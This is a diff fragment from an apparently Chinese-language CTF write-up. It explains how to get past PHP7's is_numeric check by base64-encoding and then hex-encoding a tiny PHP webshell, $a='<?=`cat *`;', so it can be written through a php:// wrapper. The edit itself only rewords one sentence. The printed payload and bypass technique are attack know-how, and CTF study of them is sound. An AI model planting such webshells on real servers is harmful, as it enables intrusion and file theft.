@@ -85,7 +85,7 @@ else{
 php5下is_numeric可识别16进制，如0x2e，然后调用hex2bin转成字符串写入木马，
 但题目环境没配好，是php7的is_numeric不能识别16进制，必须全数字，所以要另换方法。
 
-当用伪协议写入时，将木马先base64编码后转成16进制就是全是数字的字符串！
+当用伪协议写入时，将如下木马先base64编码后转成16进制就是全是数字的字符串！
 $a='<?=`cat *`;';
 $b=base64_encode($a);//$a=PD89YGNhdCAqYDs=
 $c=bin2hex('PD89YGNhdCAqYDs');
